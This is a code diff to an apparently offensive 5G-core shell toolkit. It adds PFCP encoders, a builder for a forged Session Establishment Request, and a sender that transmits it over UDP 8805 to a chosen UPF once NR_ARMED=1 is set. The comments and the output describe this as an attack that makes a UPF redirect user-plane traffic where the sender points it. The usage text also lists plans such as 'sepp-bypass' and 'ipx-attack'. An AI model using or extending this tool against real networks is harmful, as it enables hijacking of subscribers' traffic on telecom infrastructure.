@@ -741,6 +741,150 @@ ncore_decode_pfcp() {
 }
 
 
+# ── N4 / PFCP encoders ─────────────────────────────────────────────────
+# The decoder above can read a PFCP message; until these existed the module
+# had nothing that could produce one, so the N4 leg of a 5G core was the one
+# thing in this tree with a codec and no sender.  Every number here is from
+# TS 29.244, and the two that are easy to get wrong are stated in place: the
+# Length field excludes the first four octets, and PFCP IEs are NOT padded to
+# a 4-octet boundary (that is M3UA's rule, not this one).
+ncore_pfcp_u16() { printf '%04X' "$(( ${1:-0} & 0xFFFF ))"; }
+ncore_pfcp_u24() { printf '%06X' "$(( ${1:-0} & 0xFFFFFF ))"; }
+ncore_pfcp_u32() { printf '%08X' "$(( ${1:-0} & 0xFFFFFFFF ))"; }
+
+ncore_pfcp_ie() {  # <type> <value-hex>
+    local type="${1:-}" val="${2:-}"
+    [[ "$type" =~ ^[0-9]+$ ]] && (( type > 0 && type <= 32767 )) || {
+        printf 'ERROR\tIE type must be 1..32767 (bit 8 is the V flag)\n' >&2; return 2; }
+    [[ "$val" =~ ^[0-9a-fA-F]*$ ]] || { printf 'ERROR\tIE value must be hex\n' >&2; return 2; }
+    (( ${#val} % 2 == 0 )) || { printf 'ERROR\tIE value has an odd number of hex digits\n' >&2; return 2; }
+    printf '%s%s%s' "$(ncore_pfcp_u16 "$type")" "$(ncore_pfcp_u16 "$(( ${#val} / 2 ))")"         "$(printf '%s' "$val" | tr 'a-f' 'A-F')"
+}
+
+# §7.2.2.1: flags(1) type(1) length(2) [SEID(8)] seq(3) spare(1) IEs.
+# The S flag (bit 1 of the flags octet) is 1 exactly on session-related
+# messages, and those are the ones that carry a SEID.
+ncore_pfcp_msg() {  # <type> <seq> <body-hex> [seid]
+    local type="${1:-}" seq="${2:-1}" body="${3:-}" seid="${4:-0}"
+    [[ "$type" =~ ^[0-9]+$ ]] || { printf 'ERROR\tmessage type must be numeric\n' >&2; return 2; }
+    [[ "$seq" =~ ^[0-9]+$ ]] && (( seq <= 16777215 )) || {
+        printf 'ERROR\tsequence number is 3 octets\n' >&2; return 2; }
+    [[ "$body" =~ ^[0-9a-fA-F]*$ ]] || { printf 'ERROR\tbody must be hex\n' >&2; return 2; }
+    local s=0 hdr_flags="20"
+    if ncore_pfcp_session_type "$type"; then s=1; hdr_flags="21"; fi
+    local len=$(( (s ? 8 : 0) + 4 + ${#body} / 2 ))
+    local out; out=$(printf '%s%02X%s' "$hdr_flags" "$(( type & 0xFF ))" "$(ncore_pfcp_u16 "$len")")
+    if (( s == 1 )); then
+        [[ "$seid" =~ ^[0-9]+$ ]] || { printf 'ERROR\tSEID must be numeric\n' >&2; return 2; }
+        out+=$(printf '%016X' "$(( seid & 0xFFFFFFFFFFFFFFFF ))")
+    fi
+    out+=$(ncore_pfcp_u24 "$seq")
+    out+="00"
+    printf '%s%s' "$out" "${body^^}"
+}
+
+ncore_pfcp_ipv4_hex() {  # <dotted-quad>
+    local ip="${1:-}" a b c d
+    IFS='.' read -r a b c d <<< "$ip"
+    [[ "$a" =~ ^[0-9]{1,3}$ && "$b" =~ ^[0-9]{1,3}$ && "$c" =~ ^[0-9]{1,3}$ && "$d" =~ ^[0-9]{1,3}$ ]] || {
+        printf 'ERROR\tIPv4 dotted quad expected: %s\n' "$(ncore_sanitize "$ip")" >&2; return 2; }
+    (( a <= 255 && b <= 255 && c <= 255 && d <= 255 )) || {
+        printf 'ERROR\tIPv4 octet out of range: %s\n' "$(ncore_sanitize "$ip")" >&2; return 2; }
+    printf '%02X%02X%02X%02X' "$a" "$b" "$c" "$d"
+}
+
+# §8.2.3 F-TEID: Flags, then TEID, then the address.  Bit 1 of the flags is
+# V4, and a TEID is present whenever the CH/CHID bits say nothing else.
+ncore_pfcp_fteid() {  # <teid> <ipv4>
+    local teid="${1:-}" ip="${2:-}"
+    [[ "$teid" =~ ^[0-9]+$ ]] || { printf 'ERROR\tTEID must be numeric\n' >&2; return 2; }
+    local addr; addr=$(ncore_pfcp_ipv4_hex "$ip") || return 2
+    printf '01%s%s' "$(ncore_pfcp_u32 "$teid")" "$addr"
+}
+
+# §8.2.62 UE IP Address: Flags then the address.  The flag octet here is
+# NOT the F-TEID layout: this table orders V6 first (bit 1 = 0x01), so an
+# IPv4-only address has V4 at bit 2 and the flags octet is 0x02.  Getting
+# this by analogy with F-TEID yields a message tshark reads as "V6 present,
+# V4 absent" and then flags as malformed at the end of the IE.
+ncore_pfcp_ue_ip() {  # <ipv4>
+    local addr; addr=$(ncore_pfcp_ipv4_hex "${1:-}") || return 2
+    printf '02%s' "$addr"
+}
+
+# A complete Session Establishment Request (§7.5.2): one PDR matching the
+# access side, one FAR forwarding to the core, one QER with both gates open.
+# This is the message an SMF sends a UPF to create the user-plane session,
+# so it is the one a forged N4 message would be: a UPF that accepts it
+# installs forwarding state for a TEID the sender chose.
+ncore_pfcp_build_est() {  # [teid] [ue-ip] [seq] [seid] [upf-ip]
+    local teid="${1:-1}" ue_ip="${2:-10.45.0.2}" seq="${3:-1}" seid="${4:-0}" upf_ip="${5:-10.45.0.1}"
+    local pdi pdr far qer body
+    pdi=$(ncore_pfcp_ie 20 00) || return 2                     # Source Interface: access
+    pdi+=$(ncore_pfcp_ie 21 "$(ncore_pfcp_fteid "$teid" "$upf_ip")") || return 2
+    pdi+=$(ncore_pfcp_ie 93 "$(ncore_pfcp_ue_ip "$ue_ip")") || return 2
+    pdr=$(ncore_pfcp_ie 56 "$(ncore_pfcp_u16 1)") || return 2  # PDR ID 1
+    pdr+=$(ncore_pfcp_ie 29 "$(ncore_pfcp_u32 100)") || return 2 # Precedence
+    pdr+=$(ncore_pfcp_ie 2 "$pdi") || return 2
+    pdr+=$(ncore_pfcp_ie 108 "$(ncore_pfcp_u32 1)") || return 2 # FAR ID
+    pdr+=$(ncore_pfcp_ie 109 "$(ncore_pfcp_u32 1)") || return 2 # QER ID
+    far=$(ncore_pfcp_ie 108 "$(ncore_pfcp_u32 1)") || return 2
+    far+=$(ncore_pfcp_ie 44 02) || return 2                     # Apply Action: FORW
+    far+=$(ncore_pfcp_ie 4 "$(ncore_pfcp_ie 42 01)") || return 2 # Destination: core
+    qer=$(ncore_pfcp_ie 109 "$(ncore_pfcp_u32 1)") || return 2
+    qer+=$(ncore_pfcp_ie 25 00) || return 2                     # Gate Status: both open
+    body=$(ncore_pfcp_ie 1 "$pdr") || return 2
+    body+=$(ncore_pfcp_ie 3 "$far") || return 2
+    body+=$(ncore_pfcp_ie 7 "$qer") || return 2
+    ncore_pfcp_msg 50 "$seq" "$body" "$seid" || return 2
+}
+
+ncore_cmd_pfcp_build() {  # [teid] [ue-ip] [seq] [seid] [upf-ip]
+    local hex; hex=$(ncore_pfcp_build_est "${1:-1}" "${2:-10.45.0.2}" "${3:-1}" \
+                        "${4:-0}" "${5:-10.45.0.1}") || return 1
+    local dec; dec=$(ncore_decode_pfcp "$hex") || return 1
+    printf 'message\tSession Establishment Request\n'
+    printf 'message_type\t50\n'
+    printf 'octets\t%s\n' "$(( ${#hex} / 2 ))"
+    printf 'hex\t%s\n' "$hex"
+    printf 'length_agrees\t%s\n' "$(printf '%s\n' "$dec" | awk -F'\t' '$1=="length_agrees"{print $2; exit}')"
+    printf 'ie_count\t%s\n' "$(printf '%s\n' "$dec" | awk -F'\t' '$1=="ie_count"{print $2; exit}')"
+    printf 'seid\t%s\n' "$(printf '%s\n' "$dec" | awk -F'\t' '$1=="seid"{print $2; exit}')"
+    printf 'sequence\t%s\n' "$(printf '%s\n' "$dec" | awk -F'\t' '$1=="sequence"{print $2; exit}')"
+    printf 'f_teid\t%s\n' "$(printf '%s\n' "$dec" | awk -F'\t' '$1=="ie.0.2.1.value"{print $2; exit}')"
+    printf 'attack\ta UPF that accepts this installs forwarding state for a TEID the sender chose; the user plane then goes where the sender pointed it\n'
+}
+
+# --pfcp-build produces the octets and stops; this puts them on UDP 8805.
+# Armed for the same reason every other sender in this tree is: a builder is
+# not a target, and one typo must not be the difference.  The datagram proves
+# only that the kernel accepted it -- PFCP has no acknowledgement of its own
+# outside the response message -- so a silent peer is reported as unconfirmed.
+ncore_cmd_pfcp_send() {  # <upf-host> [port] [hex]
+    local host="${1:-}" port="${2:-8805}" hex="${3:-}"
+    local tool="$IMSISTING_ROOT/tools/udp_assoc.py"
+    if [[ "${NR_ARMED:-0}" != "1" ]]; then
+        printf 'status\tdisarmed\n'
+        printf 'reason\ta PFCP datagram is sent only when NR_ARMED=1; the octets build either way\n'
+        printf 'would_send\t%s to %s:%s as PFCP, UDP\n' \
+            "${hex:-<a forged Session Establishment Request>}" "${host:-<no host given>}" "$port"
+        return 3
+    fi
+    if [[ -z "$host" ]]; then
+        printf 'ERROR\tneed <upf-host> [port] [hex]\n' >&2
+        return 2
+    fi
+    [[ -f "$tool" ]] || { printf 'ERROR\t%s is missing; cannot send\n' "$tool" >&2; return 1; }
+    if [[ -z "$hex" ]]; then
+        hex=$(ncore_pfcp_build_est 1 10.45.0.2 1 0 10.45.0.1) || {
+            printf 'ERROR\tthe PFCP builder returned no octets\n' >&2; return 1; }
+    fi
+    printf 'leg\tPFCP (N4)\n'
+    printf 'target\t%s:%s\n' "$host" "$port"
+    printf 'encapsulation\tudp\n'
+    timeout 30 python3 "$tool" send "$host" "$port" "$hex" --wait "${NR_WAIT:-0}"
+}
+
 # The rule structure a Session Establishment Request builds:
 #   PDR  (Packet Detection Rule)  matches traffic  -> PDI, precedence, FAR ID, QER ID, URR ID
 #   FAR  (Forwarding Action Rule) applies action   -> Apply Action, Forwarding Parameters
@@ -1453,6 +1597,32 @@ ncore_selftest() {
     chk pfcp-ie-leftover  "$(ncore_decode_pfcp '21 32 000F 0000000000000001 000001 00 0013 0001 01 0013' >/dev/null 2>&1; echo $?)" "1"
     chk pfcp-len-mismatch "$(fld "$(ncore_decode_pfcp '21 32 000B 0000000000000001 000001 00 0013 0001 01')" length_agrees)" "no (declared 11, the frame carries 17 after the first four)"
 
+    # 7b. The encoders.  A built message must survive this module's own
+    #     decoder and tshark's dissector: the round trip here is the first
+    #     of those, and the octets are pinned so a later edit cannot drift
+    #     them silently.  The F-TEID and UE IP flag octets are the two that
+    #     are easy to transpose (V4 is bit 1 on F-TEID and bit 2 here).
+    out=$(ncore_cmd_pfcp_build 1 10.45.0.2 7 0 10.45.0.1)
+    chk pfcp-build-type   "$(fld "$out" message_type)"    "50"
+    chk pfcp-build-octets "$(fld "$out" octets)"          "124"
+    chk pfcp-build-len    "$(fld "$out" length_agrees)"   "yes"
+    chk pfcp-build-count  "$(fld "$out" ie_count)"        "3"
+    chk pfcp-build-seq    "$(fld "$out" sequence)"        "7"
+    chk pfcp-build-fteid  "$(fld "$out" f_teid)"          "01000000010A2D0001"
+    chk pfcp-build-hex    "$(fld "$out" hex | cut -c1-16)" "2132007800000000"
+    chk pfcp-ie-enc       "$(ncore_pfcp_ie 44 02)"        "002C000102"
+    chk pfcp-ie-upper     "$(ncore_pfcp_ie 20 0f)"        "001400010F"
+    # The UE IP Address flags octet is 0x02 (V4 at bit 2), not 0x01.
+    chk pfcp-ueip-flags   "$(ncore_pfcp_ue_ip 10.45.0.2)" "020A2D0002"
+    chk pfcp-ueip-bad     "$(ncore_pfcp_ue_ip 10.45.0.300 >/dev/null 2>&1; echo $?)" "2"
+    chk pfcp-fteid-bad    "$(ncore_pfcp_fteid abc 10.0.0.1 >/dev/null 2>&1; echo $?)" "2"
+    # A node-related message has S=0 and therefore no SEID field at all.
+    out=$(ncore_decode_pfcp "$(ncore_pfcp_msg 1 9 '' )")
+    chk pfcp-node-noseid  "$(fld "$out" seid_present)"    "no"
+    chk pfcp-node-len     "$(fld "$out" length)"          "4"
+    chk pfcp-build-rc-disarmed "$(NR_ARMED=0 ncore_cmd_pfcp_send 198.51.100.7 >/dev/null 2>&1; echo $?)" "3"
+    chk pfcp-build-rc-nohost   "$(NR_ARMED=1 ncore_cmd_pfcp_send >/dev/null 2>&1; echo $?)" "2"
+
     # 8. PFCP IE table: the real IE type numbers.
     chk ie-1   "$(ncore_pfcp_ie_name 1)"   "Create PDR"
     chk ie-2   "$(ncore_pfcp_ie_name 2)"   "PDI"
@@ -1710,6 +1880,9 @@ ncore_cli_main() {
         --aka-flow)        ncore_aka_flow ;;
         --kseaf)           ncore_cmd_kseaf "${1:-}" "${2:-}" ;;
         --pfcp-rules)      ncore_pfcp_rules "${1:-1}" "${2:-1}" ;;
+        --pfcp-build)      ncore_cmd_pfcp_build "${1:-1}" "${2:-10.45.0.2}" "${3:-1}" \
+                                                "${4:-0}" "${5:-10.45.0.1}" ;;
+        --pfcp-send)       ncore_cmd_pfcp_send "${1:-}" "${2:-8805}" "${3:-}" ;;
         --gtpu-header)     ncore_gtpu_header "${1:-1}" "${2:-1}" ;;
         --plan)            ncore_cmd_plan "${1:-}" ;;
         --selftest)        ncore_selftest ;;
@@ -1733,6 +1906,10 @@ Usage: $0 COMMAND
   --aka-flow                    5G-AKA / EAP-AKA' message flow
   --kseaf <kausf-hex> <sn-name> KSEAF = HMAC-SHA-256(KAUSF, 0x6C || SN name)
   --pfcp-rules [teid] [qfi]     the PDR/FAR/QER/URR rule structure
+  --pfcp-build [teid] [ue-ip] [seq] [seid] [upf-ip]
+                                build a Session Establishment Request (type 50)
+  --pfcp-send <upf-host> [port] [hex]
+                                send it on UDP 8805, needs NR_ARMED=1
   --gtpu-header [teid] [qfi]    build an N3 GTP-U header with the QFI
   --plan <name>                 write a handoff plan
                                 (n2-expose|nrf-discovery|sepp-bypass|ipx-attack)
